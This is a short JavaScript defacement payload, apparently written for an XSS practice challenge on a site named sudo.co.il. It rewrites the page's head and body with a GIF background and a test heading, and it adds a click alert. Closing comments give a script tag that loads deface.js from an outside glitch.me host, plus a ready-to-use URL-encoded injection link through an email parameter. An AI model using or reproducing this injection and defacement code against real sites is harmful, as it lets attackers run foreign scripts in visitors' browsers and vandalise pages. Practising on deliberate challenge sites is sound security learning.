document.head.innerHTML = `<style>* {
  background-image: url('https://c.tenor.com/Xrt-ty39PfEAAAAC/elon-musk-smoke.gif');
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
alert(zone de test xss)
.test {
  
}

h1 {
color: white;
text-align:center;

}

</style>`;

document.body.innerHTML = `
<div class="test">
  <h1>test test</h1>
</div>
`;

window.addEventListener('click', e => alert('TEST'));


// <script src="https://dolomite-sunset-tower.glitch.me/deface.js"></script>
// FULL LINK ENCODED : https://sudo.co.il/xss/level0.php?email=%3Cscript%20src%3D%22https%3A%2F%2Fdolomite-sunset-tower.glitch.me%2Fdeface.js%22%3E%3C%2Fscript%3E
